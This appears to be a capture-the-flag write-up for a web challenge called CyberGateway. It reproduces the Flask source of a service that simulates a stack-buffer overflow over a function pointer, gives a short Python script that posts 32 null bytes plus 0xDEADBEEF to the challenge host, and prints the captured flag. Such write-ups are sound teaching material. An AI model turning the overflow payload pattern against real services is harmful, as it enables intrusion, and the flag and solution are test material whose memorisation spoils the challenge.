---
tags: 
references:
---
# CyberGateway
Solves: 
Tags: #web #pwn #bof
## Description
> Wait, Neo is now is Cyberpunk? Is there a Morpheus as well? And what will he be offering Neo? This world is very 0x41414141.
## Overview
It's a website that simulates the stack.
## Code review
The code is relatively simple. The goal is to make a request that triggers `SECRET_ROUTE`.
```python
import os
from flask import Flask, request, abort
from string import printable

app = Flask(__name__)

FLAG = os.getenv("FLAG", "flag{fake_flag}")

SECRET_ROUTE    = 0xDEADBEEF
CYBER_ROUTE     = 0x41414141

def secret_gateway_route():
    return f"Wake up {FLAG}"

def cyber_gateway_route():
    return f"You take the {hex(CYBER_ROUTE)} route, the story ends. You wake up in your bed and believe whatever you want to believe. You take the {hex(SECRET_ROUTE)} route, you stay in Wonderland. And I show you how deep the rabbit hole goes."

function_map = {
    SECRET_ROUTE: secret_gateway_route,
    CYBER_ROUTE: cyber_gateway_route
}

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return (
            "Welcome to our super secure cyber gateway service!<br>"
            "Send a POST request with data to push onto our stack.<br>"
        )

    elif request.method == "POST":
        user_data = request.get_data()
        if not user_data:
            abort(400, "No input data provided.")

        if b"A" in user_data:
            abort(400, "Hacking detected")

        for char in user_data:
            if chr(char) in printable:
                abort(400, "Invalid gateway request")
        
        stack_size = 32
        fp_size = 4  
        total_size = stack_size + fp_size

        stack_memory = bytearray(total_size)

        stack_memory[stack_size : stack_size + fp_size] = CYBER_ROUTE.to_bytes(4, "little")

        for i, b in enumerate(user_data):
            if i < total_size:
                stack_memory[i] = b
            else:
                break

        fp = int.from_bytes(stack_memory[stack_size : stack_size + fp_size], "little")
        if fp in function_map:
            result = function_map[fp]()
        else:
            result = f"Segfault! Invalid function pointer: {fp}"

        return result

if __name__ == "__main__":
    app.run("0.0.0.0", port=1337, debug=False)

```
## Exploitation

Simple buffer overflow
```python
import requests

host = "8bxwpsoqtqzzerp4.dyn.acsc.land"
port = 443

# Send POST request with non-printable bytes to trigger the secret route
payload = b"\x00"*32 + b"\xef\xbe\xad\xde"

url = f"https://{host}:{port}/"
response = requests.post(url, data=payload, verify=False)

print(response.text)
```

`dach2025{cyber_n3o_w0ke_up_vkpvgqtidj9o01bu}`